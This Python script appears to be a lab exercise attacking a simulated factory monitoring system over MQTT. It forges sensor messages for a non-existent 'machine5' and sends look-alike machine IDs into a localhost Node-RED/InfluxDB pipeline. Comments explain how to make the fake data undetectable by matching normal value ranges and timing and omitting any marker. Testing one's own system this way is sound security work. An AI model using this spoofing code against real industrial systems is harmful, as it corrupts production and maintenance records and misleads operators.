import time
import json
import random
import paho.mqtt.client as mqtt
from datetime import datetime

# WHY this attack is the most dangerous:
# Attack 1 = wrong values on known machines (visible on dashboard)
# Attack 2 = flooding (noisy, rate detectable)
# Attack 3 = completely new/fake identity (silent, looks legitimate)
#
# In a real factory this could:
# - Inject a fake machine5 into historical OEE reports
# - Make management think there are more machines than exist
# - Slip past security rules that only check known machine IDs
# - Create ghost maintenance records for machines that don't exist

BROKER = "localhost"
PORT = 1883

# ── Scenario 1: Ghost Machine ────────────────────────────────
# Inject a machine5 that doesn't exist in the real system
# All values look completely legitimate — within normal ranges
# Node-RED wildcard topic accepts it automatically

def run_ghost_machine(client, duration=30):
    """
    WHY ghost machine is dangerous:
    Your Node-RED uses wildcard topic factory/+/data
    This means it accepts messages from ANY machine ID
    machine5 gets stored in InfluxDB alongside real machines
    Grafana will show machine5 data as if it's real
    A future Grafana row for machine5 would display this data
    """
    print()
    print("─" * 50)
    print("SCENARIO 1 — Ghost Machine (machine5)")
    print("─" * 50)
    print("Injecting fake machine5 into the system.")
    print("Node-RED will process and store it in InfluxDB.")
    print("Check InfluxDB after — machine5 will be there.")
    print()

    fake_production = 0
    start = time.time()
    count = 0

    while time.time() - start < duration:
        # WHY realistic values:
        # Values within normal operating range
        # Nothing to trigger a threshold alarm
        # Looks exactly like a real machine
        status = "ON" if random.random() < 0.83 else "OFF"

        if status == "ON":
            temperature = round(random.uniform(44, 74), 2)
            fake_production += random.randint(1, 5)
        else:
            temperature = round(random.uniform(30, 40), 2)

        ghost_data = {
            "machine_id": "machine5",        # doesn't exist!
            "status": status,
            "temperature": temperature,
            "production_count": fake_production,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            # WHY no 'spoofed' flag here:
            # Attack 1 had 'injected: True' as a marker
            # A real attacker would NOT include any marker
            # This data is indistinguishable from real data
        }

        # WHY publish to machine5 topic:
        # The wildcard factory/+/data catches this automatically
        # No special configuration needed on the attacker side
        client.publish("factory/machine5/data",
                       json.dumps(ghost_data))
        count += 1

        print(f"[GHOST #{count}] machine5 | "
              f"status={status} | "
              f"temp={temperature}°C | "
              f"count={fake_production}")

        time.sleep(3)  # match normal simulator timing exactly

    print(f"\nScenario 1 complete. Sent {count} ghost messages.")
    print("machine5 now exists in InfluxDB — permanently.")


# ── Scenario 2: Identity Confusion ───────────────────────────
# Send messages with slightly wrong machine IDs
# Tests whether your system validates machine IDs strictly

def run_identity_confusion(client, duration=30):
    """
    WHY identity confusion matters:
    Most basic security filters check exact string match.
    'machine1' != 'Machine1' != 'machine_1' != 'MACHINE1'
    An attacker tries variations to find one that slips through.
    Each variation that gets stored creates orphaned records
    that corrupt your data analytics and OEE calculations.
    """
    print()
    print("─" * 50)
    print("SCENARIO 2 — Identity Confusion")
    print("─" * 50)
    print("Sending messages with invalid machine ID variations.")
    print("Testing whether Node-RED validates machine IDs.")
    print()

    # Variations of machine1 that look similar but are different
    # WHY these specific variations:
    # Capital letter — case sensitivity test
    # Underscore — delimiter variation
    # Space — whitespace injection
    # machine-1 — hyphen variation
    # machine01 — zero-padded
    fake_ids = [
        "Machine1",      # capital M
        "machine_1",     # underscore
        "machine 1",     # space injection
        "machine-1",     # hyphen
        "machine01",     # zero padded
        "machine1 ",     # trailing space
        " machine1",     # leading space
        "MACHINE1",      # all caps
    ]

    start = time.time()
    count = 0

    while time.time() - start < duration:
        for fake_id in fake_ids:
            confusion_data = {
                "machine_id": fake_id,
                "status": "ON",
                "temperature": round(random.uniform(44, 74), 2),
                "production_count": random.randint(100, 500),
                "timestamp": datetime.now().strftime(
                    "%Y-%m-%d %H:%M:%S")
            }

            # WHY publish to machine1 topic with wrong ID:
            # The topic is correct (factory/machine1/data)
            # but the machine_id field inside the payload is wrong
            # This tests whether Node-RED checks the payload
            # machine_id against the topic name
            client.publish("factory/machine1/data",
                           json.dumps(confusion_data))
            count += 1

            print(f"[CONFUSION #{count}] "
                  f"Sent fake ID: '{fake_id}'")
            time.sleep(0.5)

        time.sleep(2)

    print(f"\nScenario 2 complete. Sent {count} confusion messages.")
    print("Check InfluxDB — look for orphaned machine_id values.")


# ── Main ──────────────────────────────────────────────────────

print("=" * 60)
print("ATTACK 3 — IDENTITY SPOOFING")
print("=" * 60)
print("Two scenarios:")
print("  1. Ghost machine  — inject fake machine5")
print("  2. Identity confusion — invalid machine ID variations")
print("=" * 60)

client = mqtt.Client(client_id="spoofer_attacker_001")
client.connect(BROKER, PORT, 60)
client.loop_start()

try:
    # Run scenario 1 first
    run_ghost_machine(client, duration=30)

    print("\nStarting Scenario 2 in 3 seconds...")
    time.sleep(3)

    # Then scenario 2
    run_identity_confusion(client, duration=30)

except KeyboardInterrupt:
    print("\nAttack interrupted.")

finally:
    client.loop_stop()
    client.disconnect()

    print()
    print("=" * 60)
    print("ATTACK 3 COMPLETE")
    print("Key findings to verify:")
    print("  → Open InfluxDB Data Explorer")
    print("  → Query machine_data bucket")
    print("  → Filter by machine_id field")
    print("  → You should see machine5 and variations of machine1")
    print("  → These records are now permanently in your database")
    print("=" * 60)